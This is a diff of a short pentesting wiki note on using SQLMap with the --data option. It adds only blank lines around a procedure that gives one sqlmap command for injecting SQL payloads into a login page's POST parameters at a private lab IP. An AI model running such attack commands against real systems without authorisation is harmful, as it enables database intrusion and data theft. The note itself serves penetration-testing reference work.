@@ -32,17 +32,29 @@ SQLMap is an automated SQL injection exploitation tool. Data can be specified wi
 
 SQLMap is an automated SQL injection exploitation tool. Data can be specified with *--data* option.
 
+
+
 # Procedure
 
 # 
 
 1. The following SQLMap command can be used to pass the parameters in the page. The parameters are injected with SQL payloads.
 
+
+
+
+
+
+
 **Command** ([[SQLMap Command With Data]]):
 
 ```bash
 sqlmap -u 'http://192.168.1.10/vcart/login.php' --data='user=demo@vcart.com&pass=demo&selop=2'
 ```
+
+
+
+
 
 ## Platforms
 
@@ -59,3 +71,5 @@ sqlmap -u 'http://192.168.1.10/vcart/login.php' --data='user=demo@vcart.com&pass
 - [[sqli]]
 - [[SQLMap]]
 - [[Web Applications]]
+
+
